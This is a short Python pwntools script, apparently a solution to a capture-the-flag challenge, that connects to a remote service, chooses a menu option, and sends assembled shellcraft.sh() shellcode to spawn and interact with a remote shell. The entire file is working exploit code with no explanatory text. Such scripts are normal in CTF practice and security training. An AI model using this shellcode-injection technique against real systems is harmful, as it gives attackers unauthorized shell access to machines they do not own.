#!/usr/bin/env python3
import os
os.environ['PWNLIB_NOTERM'] = 'True'  # Configuration patch to allow pwntools to be run inside of an IDE
os.environ['PWNLIB_SILENT'] = 'True'
from pwn import *

HOST = "svtctf.m0lecon.it" 
PORT = 13424

context.update(arch= 'amd64', os='linux')

def make_payload():
    #get assembly to open a shell
    shellcode = shellcraft.sh()

    #assemble it into bytes
    shellcode_b = asm(shellcode)

    payload = shellcode_b

    return payload

def main():

    io = remote(HOST, PORT)
    g = io.recvuntil(b'Choose an option: \n')
    print(g)
    io.sendline(b'4')

    payload = make_payload()
    g = io.recvuntil(b'Enter the size of your shellcode: \n')
    print(g)
    io.sendline(str(len(payload)).encode())

    g = io.recvuntil(b'Enter your shellcode: ')
    print(g)
    io.sendline(payload)

    # read remainder of program output
    io.interactive()

if __name__ == '__main__':
    main()
